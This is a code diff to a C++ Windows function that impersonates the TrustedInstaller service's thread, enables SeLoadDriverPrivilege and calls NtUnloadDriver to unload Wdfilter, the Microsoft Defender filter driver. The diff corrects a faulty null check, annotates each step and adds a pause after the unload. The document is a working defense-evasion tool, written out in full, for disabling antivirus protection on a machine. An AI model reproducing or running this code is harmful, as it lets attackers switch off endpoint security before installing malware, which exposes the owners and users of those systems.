@@ -3,11 +3,11 @@
 NTSTATUS ImpersonateAndUnload()
 {
 #pragma region nt_imports
-	// load NtDll and resolve the addresses of NtMakeTemporaryObject(), NtOpenSymbolicLinkObject(), and NtCreateSymbolicLinkObject()
+	// load NtDll and resolve the addresses of NtImpersonateThread() and NtUnloadDriver()
 	RAII::Hmodule ntdllModule = LoadLibraryW(L"ntdll.dll");
 	if (!ntdllModule.GetHmodule())
 	{
-		std::cout << "[-] Couldn't resolve ntdll address! Error: 0x" << std::hex << GetLastError() << std::endl;
+		std::cout << "[-] Couldn't open a handle to ntdll! Error: 0x" << std::hex << GetLastError() << std::endl;
 		return 1;
 	}
 
@@ -19,7 +19,7 @@ NTSTATUS ImpersonateAndUnload()
 	}
 
 	pNtUnloadDriver NtUnloadDriver = (pNtUnloadDriver)GetProcAddress(ntdllModule.GetHmodule(), "NtUnloadDriver");
-	if (!NtImpersonateThread)
+	if (!NtUnloadDriver)
 	{
 		std::cout << "[-] Couldn't resolve NtUnloadDriver address! Error: 0x" << std::hex << GetLastError() << std::endl;
 		return 1;
@@ -33,7 +33,7 @@ NTSTATUS ImpersonateAndUnload()
 		// 4. unload Wdfilter
 
 #pragma region impersonating_TrustedInstaller
-	// step 1
+	// step 1 - open the service manager, then start TrustedInstaller
 	RAII::ScHandle svcManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
 	if (!svcManager.GetHandle())
 	{
@@ -52,7 +52,7 @@ NTSTATUS ImpersonateAndUnload()
 	else std::cout << "[+] Opened handle to the TrustedInstaller service!\n";
 
 	auto success = StartServiceW(trustedInstSvc.GetHandle(), 0, nullptr);
-	if (!success && GetLastError() != 0x420)
+	if (!success && GetLastError() != 0x420) // 0x420 is the error code returned when the service is already running
 	{
 		Error(GetLastError());
 		std::cout << "[-] Couldn't start TrustedInstaller service...\n";
@@ -60,7 +60,7 @@ NTSTATUS ImpersonateAndUnload()
 	}
 	else std::cout << "[+] Successfully started the TrustedInstaller service!\n";
 
-	// step 2
+	// step 2 - find the TrustedInstaller process and get a handle to its first thread
 	auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
 	if (trustedInstPid == ERROR_FILE_NOT_FOUND)
 	{
@@ -83,7 +83,7 @@ NTSTATUS ImpersonateAndUnload()
 	}
 	else std::cout << "[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the TrustedInstaller process' first thread!\n";
 
-	// step 3
+	// step 3 - impersonate the thread to get TrustedInstaller privilege for the current thread
 	SECURITY_QUALITY_OF_SERVICE sqos = {};
 	sqos.Length = sizeof(sqos);
 	sqos.ImpersonationLevel = SecurityImpersonation;
@@ -98,7 +98,7 @@ NTSTATUS ImpersonateAndUnload()
 #pragma endregion current thread token now has TrustedInstaller privileges
 
 #pragma region unloading_wdfilter
-	// step 4
+	// step 4 - set the SeLoadDriverPrivilege for the current thread and call NtUnloadDriver to unload Wdfilter
 	HANDLE tempHandle;
 	success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
 	if (!success)
@@ -112,13 +112,17 @@ NTSTATUS ImpersonateAndUnload()
 	success = SetPrivilege(currentToken.GetHandle(), L"SeLoadDriverPrivilege", true);
 	if (!success) return 1;
 
-	UNICODE_STRING wdfilterDrivServ{};
+	UNICODE_STRING wdfilterDrivServ;
 	RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
 	status = NtUnloadDriver(&wdfilterDrivServ);
-	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully unloaded Wdfilter!\n";
+	if (status == STATUS_SUCCESS) 
+	{
+		std::cout << "[+] Successfully unloaded Wdfilter! Waiting 50 seconds...\n";
+		Sleep(50000);
+	}
 	else
 	{
-		Error(RtlNtStatusToDosError(status));
+		Error(status);
 		std::cout << "[-] Failed to unload Wdfilter...\n";
 	}
 #pragma endregion Wdfilter is unloaded
